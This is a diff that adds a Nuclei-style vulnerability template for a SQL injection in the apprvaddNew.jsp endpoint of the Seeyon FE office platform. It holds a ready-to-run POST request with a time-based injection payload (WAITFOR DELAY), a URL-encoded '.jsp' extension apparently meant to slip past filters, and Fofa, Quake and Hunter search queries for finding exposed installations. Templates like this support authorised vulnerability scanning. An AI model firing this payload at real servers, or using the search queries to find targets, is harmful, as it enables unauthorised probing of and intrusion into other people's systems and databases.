@@ -1,0 +1,31 @@
+id: Seeyon_FE_OA_apprvaddNew_SQL_injected
+
+info:
+  name: Seeyon_FE_OA_apprvaddNew_SQL_injected
+  author: HK
+  severity: high
+  description: 致远互联FE协作办公平台 apprvaddNew.jsp SQL注入漏洞复现
+  metadata:
+    max-request: 1
+    Fofa-query: body="li_plugins_download"
+    Quake-query: body="li_plugins_download"
+    Hunter-query: body="li_plugins_download"
+    verified: true
+http:
+- raw:
+  - |
+    @timeout: 30s
+    POST /witapprovemanage/apprvaddNew.j%73p HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent:Mozilla/5.0 (WindowsNT10.0;Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko)Chrome/96.0.4664.93Safari/537.36
+    Content-Type:application/x-www-form-urlencoded
+    Content-Length: 39
+
+    flowid=1';WAITFOR+DELAY+'0:0:4'--+---
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 4'
